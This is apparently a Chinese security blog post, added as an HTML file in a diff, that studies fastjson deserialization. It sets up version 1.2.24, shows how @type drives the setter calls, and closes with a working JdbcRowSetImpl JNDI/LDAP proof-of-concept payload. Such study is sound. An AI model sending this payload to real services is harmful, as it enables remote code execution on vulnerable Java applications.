@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+	<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,minimal-ui" />
+    <title>fastjson 反序列化学习 | Ja9er&#39;s Studio</title>
+<link rel='stylesheet' id='puma-css'  href='https://ja9er.github.io/styles/main.css' type='text/css' media='screen' />
+<link rel='stylesheet' id='puma-css'  href='https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css' media='screen' />
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<script type='text/javascript' src='https://ja9er.github.io/media/scripts/jquery.js'></script>
+<script type='text/javascript' src='https://ja9er.github.io/media/scripts/jquery-migrate.min.js'></script>
+        <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+         <script >hljs.initHighlightingOnLoad();</script>
+         
+</head>
+<body class="single single-post postid-3788 single-format-standard">
+	<!--加入跟随滑动的顶部-->
+	<header id="masthead" class="site-header" role="banner">
+		<div class="site-branding">
+			<h1 class="site-title">
+				<a href="https://ja9er.github.io" title="Ja9er&#39;s Studio">Ja9er&#39;s Studio</a>
+				
+			</h1>
+		</div>
+
+		<a class="primary-nav-trigger" href="javascript:void(0)">
+			<span class="menu-icon"></span>
+		</a>
+		
+	</header>
+		<div class="site-navigation-wrapper">
+		<nav id="site-navigation" class="main-navigation" role="navigation">
+			<ul class="primary-nav">
+                    
+				<li id="menu-item-30" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30"><a title="首页" href="/">首页</a></li>
+                
+				<li id="menu-item-30" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30"><a title="归档" href="/archives">归档</a></li>
+                
+				<li id="menu-item-30" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30"><a title="标签" href="/tags">标签</a></li>
+                
+				<li id="menu-item-30" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30"><a title="关于" href="/post/about">关于</a></li>
+                
+	
+			</ul>
+		</nav>			
+	</div>
+	<!--跟随滑动的顶部结束-->
+	<div class="surface-content">    <main class="main-content">
+        <section class="section-body">
+                            <header class="section-header u-textAlignCenter">
+                    <h2 class="grap--h2">fastjson 反序列化学习</h2>
+                    <div class="block-postMetaWrap">
+                        <time>2022-08-09</time>
+                    </div>
+                </header>
+                <div class="grap">
+					
+					<h2 id="0x001-搭建环境">0X001 搭建环境</h2>
+<p>IDEA新建maven项目<br>
+手动插入</p>
+<pre><code class="language-java">&lt;dependency&gt;
+&lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+&lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+&lt;version&gt;1.2.24&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><a href="https://imgloc.com/i/0HXWk"><img src="https://s1.328888.xyz/2022/08/09/0HXWk.png" alt="0HXWk.png" loading="lazy"></a></figure>
+<h2 id="0x002-知识点">0X002 知识点</h2>
+<p>使用fastjson转换类，首先需要使用函数json.toJSONString。该函数会将一个实例序列化为一个json字符串。<br>
+json.toJSONString函数的参数中加入SerializerFeature.WriteClassName参数时，其会将对象类型一起序列化并且会写入到 <strong>@type</strong> 字段中。如下所示</p>
+<pre><code class="language-java">user user = new user(&quot;张三&quot;,18,&quot;学习&quot;);
+String s1 = JSON.toJSONString(user);
+String s2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
+System.out.println(s1);
+System.out.println(s2);
+</code></pre>
+<p>结果可以看到多了一个@type的字段</p>
+<pre><code>调用了getName
+调用了getName
+{&quot;age&quot;:18,&quot;hobby&quot;:&quot;学习&quot;,&quot;name&quot;:&quot;张三&quot;}
+{&quot;@type&quot;:&quot;user&quot;,&quot;age&quot;:18,&quot;hobby&quot;:&quot;学习&quot;,&quot;name&quot;:&quot;张三&quot;}
+</code></pre>
+<p>在调用toJSONString时会默认调用类的get方法。</p>
+<p>接着使用JSON.parse()和JSON.parseObject方法将字符串转化为一个类。parse会转换为@type指定的类，parseObject会默认指定JSONObject类，而在parseObject参数中加一个类参数则会转换为其指定的类（这里指定Object会自动转化为JSONObject）</p>
+<pre><code class="language-java">Object parse = JSON.parse(s2);
+System.out.println(parse);
+System.out.println(parse.getClass().getName());
+Object parse1 = JSON.parseObject(s2);
+System.out.println(parse1);
+System.out.println(parse1.getClass().getName());
+Object parse2 = JSON.parseObject(s2,Object.class);
+System.out.println(parse2);
+System.out.println(parse2.getClass().getName());
+</code></pre>
+<p>结果如下所示：</p>
+<pre><code>-----------------------------------------------------
+调用了setName
+user{name='张三', age=18, hobby='学习'}
+user
+-----------------------------------------------------
+调用了setName
+调用了getName
+{&quot;name&quot;:&quot;张三&quot;,&quot;age&quot;:18,&quot;hobby&quot;:&quot;学习&quot;}
+com.alibaba.fastjson.JSONObject
+-----------------------------------------------------
+调用了setName
+user{name='张三', age=18, hobby='学习'}
+user
+</code></pre>
+<p>parse进行反序列化时，json字符串中有@type因此会自动执行指定类的set方法，并且会转换为@type指定类的类型<br>
+parseObject进行反序列时会自动执行@type指定类的get和set方法，并且转换为JSONObject类。这里可以跟进parseObject方法，可以看到先调用parse再强制转换为JSONObject类，最后调用tojson方法。<br>
+<a href="https://imgloc.com/i/0Hpkm"><img src="https://s1.328888.xyz/2022/08/09/0Hpkm.png" alt="0Hpkm.png" loading="lazy"></a><br>
+在默认情况下只会去反序列化public修饰的属性，若想反序列化私有属性，需要在parseObject()时设置Feature.SupportNonPublicField。</p>
+<p>所以综上所述，当你可以控制@type的值，且该类下的get或set类方法存在危险函数时就可能造成危害。</p>
+<h2 id="0x03-利用链">0x03 利用链</h2>
+<h3 id="1224">1.2.24</h3>
+<p>第一条利用链，<strong>JdbcRowSetImpl</strong>。<br>
+根据师傅们的教程，可以直接在setAutoCommit方法中看到，调用了this.connect方法。</p>
+<pre><code class="language-java">public void setAutoCommit(boolean var1) throws SQLException {   
+if (this.conn != null) {       
+this.conn.setAutoCommit(var1);   
+} else {       
+this.conn = this.connect();        
+this.conn.setAutoCommit(var1);    
+}}
+</code></pre>
+<p>跟进this.connect()，发现有经典的lookup函数，由于JNDI存在一个动态地址转换协议，也就是说当我们在lookup上指定一个URL的时候，就会优先于Context.PROVIDER_URL的设置进行加载我们指定的恶意类。<br>
+<a href="https://imgloc.com/i/0HqJ7"><img src="https://s1.328888.xyz/2022/08/09/0HqJ7.png" alt="0HqJ7.png" loading="lazy"></a><br>
+这个getdataSourceName的值。在setvalue的过程中被设置。也就是可控的。<br>
+得到poc:</p>
+<pre><code class="language-java">{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1/exp&quot;,&quot;autoCommit&quot;:true}&quot;
+</code></pre>
+<h1 id="未完待续">未完待续...............</h1>
+
+                </div>
+
+                <div class="post--keywords" itemprop="keywords">
+					          </div>
+
+
+
+                      </section>
+    </main>
+</div>
+	<footer class="site-footer u-textAlignCenter">
+    	<div class="footer-branding">
+            <a href="https://ja9er.github.io" title="Ja9er&#39;s Studio">Ja9er&#39;s Studio</a>
+									
+			         </div>
+		 <hr />
+		 <div class="social-links">
+		                       
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+				</div>
+        <div class="footer-copy">
+                
+        </div>
+
+    </footer>
+	<div class="back-to-top u-hide" onclick="backToTop();"><i class="iconfont icon-xiangshang"></i></div>
+
+<script type='text/javascript' src='https://ja9er.github.io/media/scripts/main.js'></script>
+</body>
+</html>
